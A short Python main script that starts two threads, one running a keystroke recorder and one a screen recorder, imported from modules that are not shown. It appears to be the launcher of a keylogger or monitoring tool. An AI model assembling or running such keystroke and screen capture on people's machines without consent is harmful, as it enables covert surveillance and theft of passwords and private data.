import threading

# we import our public classes
from recorder import Recorder
from keys_recorder import Keys_Recorder
from screen_recorder import Screen_Recorder

# we create the function that takes as parameter our abstract class and execute the method record()
def create_instance(recorder: Recorder):
    return recorder.record


if __name__ == "__main__":
    # we launch our two threads executing their object (aka the record methods) corresponding to the child of the abstract class).
    thread1 = threading.Thread(target=create_instance(Keys_Recorder))
    thread2 = threading.Thread(target=create_instance(Screen_Recorder))

    thread1.start()
    thread2.start()
